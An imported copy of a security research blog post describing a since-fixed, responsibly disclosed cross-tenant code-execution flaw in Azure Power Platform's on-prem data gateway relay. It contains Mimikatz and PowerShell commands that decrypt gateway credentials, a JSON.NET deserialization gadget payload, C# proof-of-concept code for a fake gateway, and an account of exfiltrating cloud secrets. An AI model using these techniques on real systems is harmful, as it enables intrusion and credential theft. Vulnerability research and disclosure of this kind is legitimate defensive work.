---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-30_riding-the-azure-service-bus-relay-into-power-platform.md
original_filename: 2023-03-30_riding-the-azure-service-bus-relay-into-power-platform.md
title: Riding the Azure Service Bus (Relay) into Power Platform
category: documents
detected_topics:
- automation-abuse
- api-security
- cloud-security
- access-control
- xss
- command-injection
tags:
- imported
- documents
- automation-abuse
- api-security
- cloud-security
- access-control
- xss
- command-injection
language: en
raw_sha256: e3bffae7b2137e7bd281b9c59d0ebd965ee2bca9e822610b1fdabad99f8c8918
text_sha256: e1b3532ef35067695925684fad74eb965dccab0f5dec852bc1b9aa0466e8f4d6
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# Riding the Azure Service Bus (Relay) into Power Platform

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-30_riding-the-azure-service-bus-relay-into-power-platform.md
- Source Type: markdown
- Detected Topics: automation-abuse, api-security, cloud-security, access-control, xss, command-injection
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `e3bffae7b2137e7bd281b9c59d0ebd965ee2bca9e822610b1fdabad99f8c8918`
- Text SHA256: `e1b3532ef35067695925684fad74eb965dccab0f5dec852bc1b9aa0466e8f4d6`


## Content

---
title: "Riding the Azure Service Bus (Relay) into Power Platform"
page_title: "Riding the Azure Service Bus (Relay) into Power Platform | Cloud Pentesting"
url: "https://www.netspi.com/blog/technical/vulnerability-research/azure-service-bus-power-platform/"
final_url: "https://www.netspi.com/blog/technical-blog/vulnerability-research/azure-service-bus-power-platform/"
authors: ["Nick Landers (@monoxgas)"]
programs: ["Microsoft (Azure)"]
bugs: ["RCE", "Cross-tenant vulnerability", "Cloud", "Insecure deserialization"]
publication_date: "2023-03-30"
added_date: "2023-03-31"
source: "pentester.land/writeups.json"
original_index: 1323
---

[Technical](/blog/technical-blog/#post-container) / Vulnerability Management 

# Riding the Azure Service Bus (Relay) into Power Platform

March 30, 2023

### [Nick Landers](/authors/nick-landers/)

  * [](https://www.facebook.com/sharer/sharer.php?u=https://www.netspi.com/blog/technical-blog/vulnerability-management/azure-service-bus-power-platform/)
  * [](https://twitter.com/intent/tweet?text=Riding the Azure Service Bus \(Relay\) into Power Platform&url=https://www.netspi.com/blog/technical-blog/vulnerability-management/azure-service-bus-power-platform/)
  * [](https://www.linkedin.com/shareArticle?mini=true&url=https://www.netspi.com/blog/technical-blog/vulnerability-management/azure-service-bus-power-platform/&title=Riding the Azure Service Bus \(Relay\) into Power Platform)

![Riding the Azure Service Bus \(Relay\) into Power Platform](https://www.netspi.com/wp-content/uploads/2024/03/Blog-Feature-Images-08.webp)

Azure maintains a large suite of automation tools between Logic Apps and the Power Platform (Automate, Apps, BI). [On-Prem Data Gateways](https://learn.microsoft.com/en-us/data-integration/gateway/service-gateway-onprem) extend some of these automations by allowing actions to be carried out by a connected agent installed locally in customer networks. 

Originally these gateways were just designed for Power BI and “personal use” only, but you can also connect them to an Azure tenant and make them available to the larger subscription. In essence, you can bind an on-prem data gateway to an Azure gateway1 resource, then leverage that on-prem data gateway in a limited set of Power Platform Connectors from Logic Apps. Microsoft maintains [a list of these supported connectors](https://learn.microsoft.com/en-us/azure/logic-apps/logic-apps-gateway-connection#supported-data-sources) in their documentation (we also queried support via APIs to verify its accuracy): 

  * Apache Impala 
  * BizTalk Server 
  * File System 
  * HTTP with Azure AD 
  * IBM DB2 / Informix / MQ
  * MySQL 
  * Oracle Database 
  * PostgreSQL 
  * SAP 
  * SharePoint Server
  * SQL Server 
  * Teradata 

Originally, we wanted to inspect how these logic apps interact with gateways and discover code execution opportunities from an azure tenant into a host network. You might imagine the ability to access file data or force web requests on remote hosts as quite valuable to an attacker. However, our research led us in a more interesting direction that involved cross-tenant compromise in Power Platform Connectors hosted in Azure.

## Installation Internals

The installation and setup of the gateway is straightforward. During the initial setup you’ll be prompted for account credentials, gateway name, and recovery key. After installation, the gateway should be bonded to the Power Platform, and you can verify its availability in the [Admin Portal](https://admin.powerplatform.microsoft.com/ext/DataGateways). Connecting the gateway to an Azure subscription does require you allocate a separate “On-Prem Gateway” object via the [portal](https://portal.azure.com\\#create/Microsoft.ConnectionGateway). It’s worth double checking your region and target subscription before the gateway object becomes available under “Installation Name”. 

![On-premises data gateway portal in Azure.](https://www.netspi.com/wp-content/uploads/033023_Azure-On-Prem-Blog_1.png)

![Power Platform admin center showing gateway cluster: demo-gateway.](https://www.netspi.com/wp-content/uploads/033023_Azure-On-Prem-Blog_2.png)

![Subscription and instance details within Azure data gateway.](https://www.netspi.com/wp-content/uploads/033023_Azure-On-Prem-Blog_3.png)

Back on the gateway host, a service for `Microsoft.PowerBI.EnterpriseGateway.exe` will be installed to run core functions. A configuration app `EnterpriseGatewayConfigurator.exe` is available to view the status of the service, reconfigure parameters, run diagnostics, etc. Underneath their relationship is backed by a localhost WCF TCP ServiceHost (`IGatewayConfigurationService`) using a [ServiceAuthorizationManager](https://learn.microsoft.com/en-us/dotnet/api/system.servicemodel.serviceauthorizationmanager) to limit access to administrators. 

Any curiosity regarding the “recovery key” we supplied is well founded. Gateways support both symmetric and asymmetric encryption to securely transfer sensitive credentials. When registering the gateway, the recovery key will be used to derive a symmetric key stored by the gateway host. Random bytes will be encrypted with this key and attached to an annotation field on the gateway object in the Power Platform (referred to as a “witness string”). This allows client-side verification of a matching key during recovery/change operations. In addition to symmetric material, an RSA keypair will be generated by the service and the public component will be transferred during creation. As clarified by Microsoft, the symmetric key is retained locally as a derivation of the recovery key value. 

We can see the client request to create the gateway here:
  
  
  PUT /unifiedgateway/gateways/CreateGatewayWithApps HTTP/2 
  Host: wabi-us-north-central-redirect.analysis.windows.net 
  Authorization: Bearer [token] 
  
  { 
  "createGatewayRequest": { 
  "gatewayName": "demo-gateway", 
  "gatewayDescription": null, 
  "gatewayAnnotation": "{\"gatewayContactInformation\":[\"noexist@netspi.com\"],\"gatewayVersion\":\"3000.154.3\",\"gatewayWitnessString\":\"{\\\"EncryptedResult\\\":\\\"qAesqTDEw5WdQq[…]\\\",\\\"IV\\\":\\\"Zqq9Hc2qIFNzVOBEz5ymsg==\\\",\\\"Signature\\\":\\\"i9Urdz0HlpRBEuklU[…]\\\"}\",\"gatewayMachine\":\"DESKTOP-BDI31DO\",\"gatewaySalt\":\"51lQj3EFVfousJiQuSQdYQ==\",\"gatewayWitnessStringLegacy\":null,\"gatewaySaltLegacy\":null,\"gatewayDepartment\":null,\"gatewayVirtualNetworkSubnetId\":null}", 
  "gatewayPublicKey": "PD94bWwgdmVyc2lvbj0iMS4wIj8+DQo8UlNBUGFyYW1ldGVycyB4bWxuczp4c2Q9Imh0dHA[…]", 
  "gatewayVersion": "3000.154.3", 
  "gatewaySBDetails": null, 
  "gatewaySBDetailsSecondary": null, 
  "createSecondaryRelay": true 
  } 
  }

The response to this request gives us additional context for how the gateway communicates with other components:
  
  
  HTTP/2 200 OK 
  Content-Type: application/json; charset=utf-8 
  Requestid: f30a7f4a-8dea-4b66-abe3-430054f0ed72 
  
  { 
  "gatewayId": 3139190, 
  "gatewayObjectId": "7a67b558-5ec0-4588-8c97-c2dd8ee2fb1d", 
  "gatewayName": "demo-gateway", 
  "gatewayType": "Resource", 
  "gatewaySBDetails": { 
  "gatewaySBKey": "ABBBmLK2loqL7yY414H/X33xAADL3Q/QZPLeyxbb14=", 
  "gatewaySBKeyName": "ListenAccessKey", 
  "gatewaySBEndpoint": "sb://wabi-us-north-central-relay12.servicebus.windows.net/4ec23ba7-6ebd-4ab4-921a-5256e2a27a70/" 
  }, 
  "gatewaySBDetailsSecondary": null, 
  "deprecatedServiceBusNamespace": null, 
  "deprecatedServiceBusEndpoint": null, 
  "deprecatedServiceBusNamespaceSecondary": null, 
  "deprecatedServiceBusEndpointSecondary": null 
  }

On-Prem Data Gateways leverage an allocated Azure Relay connection (`gatewaySBDetails`) to securely expose its service to the public cloud. This was [formerly known as Service Bus Relay](https://learn.microsoft.com/azure/azure-relay/relay-faq#what-happened-to-service-bus-relay-service-) hence the Service Bus key names. This allows cloud resources to bind to the gateway as if it were another cloud service and issue data processing requests. Users can supply their own relay details, or have the Power Platform allocate one. This relationship is managed by the `Microsoft.PowerBI.*` libraries and leverages a [NetTcpRelayBinding](https://learn.microsoft.com/en-us/dotnet/api/microsoft.servicebus.nettcprelaybinding) and [ServiceHost](https://learn.microsoft.com/en-us/dotnet/api/system.servicemodel.servicehost) to expose the gateway to the public cloud. You can think of this as a reverse proxy to the gateway host via Azure Relay. 

In terms of connecting to this Azure Relay, the key material is readily available to us by proxying web traffic during installation. However, inspecting the local storage of this data is also a valuable exercise. All sensitive config data is stored in “`%LocalAppData%\Microsoft\On-premises data gateway\Gateway.bin`” from the context of the service account. It’s serialized JSON block with values protected by user-context DPAPI keys. We can perform a quick extraction using Mimikatz and Powershell: 

__Extract the credentials and write blobs to disk:_ _
  
  
  PS> $file = "C:\Windows\ServiceProfiles\PBIEgwService\AppData\Local\Microsoft\On-premises data gateway\Gateway.bin" 
  PS> $creds = (cat $file | ConvertFrom-Json).credentials 
  PS> $creds 
  
  key  value 
  ---  ----- 
  SBD  AQAAANCMnd8BFdERjHoA… 
  SBDS  AQAAANCMnd8BFdERjHoA… 
  SK  AQAAANCMnd8BFdERjHoA… 
  LSK  AQAAANCMnd8BFdERjHoA… 
  FileCredentialKey AQAAANCMnd8BFdERjHoA… 
  
  PS> $creds | %{ [IO.File]::WriteAllBytes("$($_.key).bin", 
  [Convert]::FromBase64String($_.value)) } 

_Get the DPAPI_SYSTEM and service key with Mimikatz:_
  
  
  PS> .\mimikatz.exe 
  mimikatz # token::elevate 
  mimikatz # lsadump::secrets 
  mimikatz # dpapi::masterkey /in:"C:\Windows\ServiceProfiles\PBIEgwService\AppData\Roaming\Microsoft\Protect\[SID]\[KEY_GUID]" /system:[DPAPI_SYSTEM]

_Decrypt the credential blobs:_
  
  
  mimikatz # dpapi::blob /in:SBD.bin /ascii 
  mimikatz # dpapi::blob /in:SBDS.bin /ascii 
  mimikatz # dpapi::blob /in:SK.bin /ascii 
  mimikatz # dpapi::blob /in:LSK.bin /ascii 
  mimikatz # dpapi::blob /in:FileCredentialKey.bin /ascii

The contents of `FileCredentialKey` give us the best context into the other values. The `SBD` blob is the allocated Azure Relay information from gateway creation, the `SK` blob is the symmetric key derived from the recovery value, and `keyContainerName` is the CSP name for our generated asymmetric key. With installation and some internals out the way, let’s move on to how data is serialized and passed on the relay.
  
  
  { 
  "id": 3139190, 
  "isDisconnected": true, 
  "objectId": "a9e6208f-669f-412f-a542-a4538121c38b", 
  "backendUri": "https://wabi-us-north-central-redirect.analysis.windows.net/", 
  "keyContainerName": "OdgAsymmetricKey", 
  
  "serviceBusDetails": {"index": "SBD"}, 
  "serviceBusDetailsSecondary": {"index": "SBDS"}, 
  "symmetricKey": {"index": "SK"}, 
  "legacySymmetricKey": {"index": "LSK"} 
  }

## Type Handling and Binders

The interface exposed on the relay backed ServiceHost is very simple. It’s essentially a single `TransferAsync` function on the gateway side and a callback contract for replying (`TransferCallbackAsync`). Both functions take a single byte array as their argument.
  
  
  public interface IGatewayTransferCallback 
  { 
  [OperationContract(IsOneWay = true)] 
  Task TransferCallbackAsync(byte[] packet); 
  } 
  
  [ServiceContract(CallbackContract = typeof(IGatewayTransferCallback))] 
  public interface IGatewayTransferService 
  { 
  [OperationContract(IsOneWay = true)] 
  Task PingAsync(); 
  
  [OperationContract(IsOneWay = true)] 
  Task TransferAsync(byte[] packet); 
  }

The binary data passed to these functions is referred to as a Relay Packet. These packets are serialized binary data blocks, optionally compressed or chunked, and prefixed with a `RelayPacketHeader` to provide context.
  
  
  [Flags] 
  public enum ControlFlags : byte 
  { 
  None = 0, 
  EndOfData = 1, 
  HasTelemetry = 2, 
  HasCorrectDataSize = 4, 
  } 
  
  public enum XPress9Level 
  { 
  None = 0, 
  Level6 = 6, 
  Level9 = 9, 
  } 
  
  public enum DeserializationDirective 
  { 
  Json = 1, 
  BinaryRowset = 2, 
  BinaryVarData = 3, 
  } 
  
  [StructLayout(LayoutKind.Explicit, Size = 21, Pack = 1)] 
  public sealed class RelayPacketHeader 
  { 
  private ControlFlags flags; 
  private int index; 
  private int uncompressedDataSize; 
  private int compressedDataSize; 
  private XPress9Level compressionAlgorithm; 
  private DeserializationDirective deserializationDirective; 
  }

We are predominantly concerned with the `Json` deserialization directive, which is supported by standard JSON.NET (Newtonsoft) libraries. The inspection of core deserialization code leads us to an extremely concerning `TypeNameHandling.All` configuration.
  
  
  static T JsonDeserialize<T>(string payload) where T : class 
  { 
  JsonSerializerSettings settings = new JsonSerializerSettings() 
  { 
  TypeNameHandling = TypeNameHandling.All, 
  SerializationBinder = (ISerializationBinder)new DataMovementSerializationBinder() 
  // ... 
  }; 
  
  return JsonConvert.DeserializeObject<T>(payload, settings); 
  }

It would appear some considerations are made for type security. The `DataMovementSerializationBinder` is applied to check incoming type names for validity. However, the use of serialization binders for security is [**not recommended**](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html) and this binder is a great example of why. 

We’ve extracted just a small snippet of the decompiled source, but the relevant weakness is the allow listing of any types from `PowerBI`, `DataMovement`, and `Mashup` assemblies in `IsAcceptableAssemblyName` regardless of the specific type. 
  
  
  public Type BindToType(string assemblyName, string typeName) { 
  if (this.IsAcceptableBasicTypeName(typeName) ||  
  this.IsAcceptableAssemblyName(assemblyName) || 
  this.IsAcceptableDictionaryType(typeName) ||  
  this.IsAcceptableMscorlibException(assemblyName, typeName) 
  ) { 
  return this.serializationBinder.BindToType(assemblyName, typeName) 
  } 
  
  return null; 
  } 
  
  private bool IsAcceptableAssemblyName(string assemblyName) { 
  return assemblyName.StartsWith("Microsoft.PowerBI") ||  
  assemblyName.StartsWith("Microsoft.DataMovement") ||  
  assemblyName.StartsWith("Microsoft.Mashup") ||  
  assemblyName.StartsWith("Microsoft.Data.Mashup"); 
  }

A quick scan of available types leads us to `Microsoft.Mashup.Storage.SerializableDictionary`, an overload of a standard Dictionary class with a controllable value type that won’t be checked. We also need to find a vulnerable object tree that types some property as a generic `Object` to bypass `IsAssignableTo` checks, but that’s also quite trivial. Ultimately `Microsoft.PowerBI.DataMovement.Pipeline.InternalContracts.Communication.GatewayHttpWebRequest` with a nested `Microsoft.Mashup.Storage.SerializableDictionary` for our `WindowsIdentity` gadget gets the job done: 
  
  
  { 
  '$type': 'Microsoft.PowerBI.DataMovement.Pipeline.InternalContracts.Communication.GatewayHttpWebRequest, Microsoft.PowerBI.DataMovement.Pipeline.InternalContracts', 
  'request': { '$type': 'System.Byte[], mscorlib', '$value': '/w==' }, 
  'property': { 
  '$type': 'System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.Object, mscorlib]], mscorlib', 
  'foo': { 
  '$type': 'Microsoft.Mashup.Storage.SerializableDictionary`2[[System.String, mscorlib],[System.Security.Principal.WindowsIdentity, mscorlib]], Microsoft.MashupEngine', 
  'bar': { 
  'System.Security.ClaimsIdentity.actor': '**PAYLOAD**' 
  } 
  } 
  } 
  }

## Return to Sender

We now have the primitive necessary to exploit processing code on either end of the Azure Relay for code execution. We could attempt to target the gateway itself but gaining remote access to the required access keys makes this a very limited attack vector. However, going the other way is much more interesting. The Power Platform runtime, which puts messages on the relay, likely leverages the same serialization code and we already understand how to communicate on the relay. 

We can now leverage a minimal Azure relay client to bind to the cloud and wait for tasking. When a Power Platform Connector communicates with the gateway, we can wrap our serialization payload in a `RelayPacketHeader `and deliver it using `TransferCallbackAsync`. Getting the Power Platform to communicate with the fake gateway is straight-forward. We set up a fresh Logic App, select one of the on-prem supported connectors, and trigger any activity against our gateway (test connection, store credentials, query data, etc.). You can find the [proof-of-concept on Github](https://github.com/monoxgas/MiniBus) and the relevant code below.
  
  
  class GatewayTransferService : IGatewayTransferService 
  { 
  public Task PingAsync() { 
  return new Task(() => {}); 
  } 
  
  public Task TransferAsync(byte[] bytes) 
  { 
  string Payload = "..."; 
  
  var response = Encoding.Unicode.GetBytes(Payload); 
  byte[] responseBytes = new byte[response.Length + RelayPacketHeader.Size]; 
  
  new RelayPacketHeader() 
  { 
  HasCorrectDataSize = true, 
  IsLast = true, 
  Index = 0, 
  UncompressedDataSize = response.Length, 
  CompressedDataSize = response.Length, 
  CompressionAlgorithm = XPress9Level.None, 
  DeserializationDirective = DeserializationDirective.Json 
  }.Serialize(responseBytes); 
  
  Array.Copy((Array)response, 0, (Array)responseBytes, RelayPacketHeader.Size, response.Length); 
  
  IGatewayTransferCallback callback = OperationContext.Current.GetCallbackChannel<IGatewayTransferCallback>(); 
  return callback.TransferCallbackAsync(responseBytes); 
  } 
  } 
  
  // ... 
  
  ServiceBusEnvironment.SystemConnectivity.Mode = ConnectivityMode.Http; 
  
  ServiceHost serviceHost = new ServiceHost(typeof(GatewayTransferService)); 
  
  serviceHost.AddServiceEndpoint( 
  typeof(IGatewayTransferService), 
  new NetTcpRelayBinding() { IsDynamic = false }, 
  Endpoint 
  ).Behaviors.Add( 
  new TransportClientEndpointBehavior { 
  TokenProvider = TokenProvider.CreateSharedAccessSignatureTokenProvider(KeyName, Key) 
  } 
  ); 
  
  serviceHost.Open();

![Logic Apps Designer showing the Power Platform application.](https://www.netspi.com/wp-content/uploads/033023_Azure-On-Prem-Blog_4.png)

Depending on the connector used, different backends will process the final payload. Initially we delivered various exploratory payloads using various connectors, which in turn would exfiltrate environmental data to an Azure Function App. We selected the most promising backend without additional obvious sandboxing (HTTP w/ Azure AD) and deployed a full stage 2 agent into memory (Slingshot). We achieved SYSTEM access, and the execution environment was clearly deep inside first-party Power Platform services in Azure. 

From the compromised host, the IMDS endpoint granted access to an authentication token for various key vault secrets and keys. We retrieved fabric configuration files, tenant information, and access to managed identities. From the decrypted Azure VM extension settings, we were able to identify Storage Account keys along with several valid SAS token Storage Account URLs configured with long expiration durations (~3 months) and the ability to list and read files (sp=rl). Overall, we calculated access to at least 1,300 secrets/certs over ~180 vaults. When it was clear cross-tenant access was possible, we burned off the affected hosts and a full report was delivered to MSRC.

![Screenshot showing code execution on power platform connectors host.](https://www.netspi.com/wp-content/uploads/033023_Azure-On-Prem-Blog_5.png)

![Screenshot showing cross-tenant access in Azure.](https://www.netspi.com/wp-content/uploads/033023_Azure-On-Prem-Blog_6.png)

![Screenshot showing cross-tenant access in Azure.](https://www.netspi.com/wp-content/uploads/033023_Azure-On-Prem-Blog_7.png)

## Conclusion

Microsoft fixed this issue by completely rebuilding their serialization binder to enforce much stricter type allow list. They also appear to have distinct binders for both the gateway and cloud sides, but safe serialization in such a complex system clearly remains a tricky task even for Microsoft. There are many areas of related research that we didn’t get to. The Power Platform and its relationship to Azure is rich in technical complexity. I’m sure a motivated researcher could yield more interesting results from the execution of requests in the client, individual logic app functionality, gateway APIs, and data sanitization. As we also discovered, different logic apps appeared to be supported by an array of backend systems with different configurations, isolations, and intents. I hope this post can inspire fresh eyes to look at these systems more. 

### Appendix A – Disclosure Timeline 

  * September 2022: Report filed with MSRC. 
  * October 2022: MSRC opens case 75270 and additional details are provided. 
  * October 2022: Call with MSRC stakeholders to demonstrate vulnerability. 
  * November 2022: Fix is deployed to public cloud. 
  * December 2022: Fix is deployed to all remaining regions. 

### Appendix B – References 

  * <https://github.com/monoxgas/MiniBus>
  * <https://github.com/pwntester/ysoserial.net>
  * <https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf>
  * [https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)  
[binders.html](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
  * [https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.serializationbinder)  
[serializationbinder](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.serializationbinder)
  * [https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeName](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm)  
[Handling.htm](https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm)
  * <https://learn.microsoft.com/en-us/data-integration/gateway/>
  * <https://github.com/gentilkiwi/mimikatz>

## Explore More Blog Posts

[ ![](https://www.netspi.com/wp-content/uploads/2024/07/072924_TECH_GCPwn_Feature.webp) Cloud Pentesting Bypassing Microsoft Entra Conditional Access Policies via Nested App Authentication  June 22, 2026 Discover how attackers bypassed Microsoft Entra Conditional Access Policies using Nested App Authentication (NAA) flows in this technical vulnerability breakdown. Learn More ](https://www.netspi.com/blog/technical-blog/cloud-pentesting/bypassing-microsoft-entra-conditional-access-policies-via-nested-app-authentication/)[ ![](https://www.netspi.com/wp-content/uploads/2026/06/Feature-Image_Red-Plaid.jpg) Social Engineering I’m Just Asking Questions: Social Engineering as a Reporter  June 17, 2026 Dive into this real-world social engineering assessment where a fake anonymous tip and an adversary-in-the-middle framework tested the limits of an organization's security policies. Learn More ](https://www.netspi.com/blog/technical-blog/social-engineering/im-just-asking-questions-social-engineering-as-a-reporter/)[ ![](https://www.netspi.com/wp-content/uploads/2025/12/TB-Design-6_Feature-Image.png) CISO Perspectives Beyond the Hype: What Regulated Industries Need to Know Before Trusting AI Security Tooling  June 16, 2026 AI security tools can build an attack, but enterprise security teams in regulated industries need consistency, auditability, and predictable costs before they can trust one. Learn why the surrounding infrastructure is where most AI security vendors are still falling short. Learn More ](https://www.netspi.com/blog/executive-blog/ciso-perspectives/beyond-the-hype-what-regulated-industries-need-to-know-before-trusting-ai-security-tooling/)
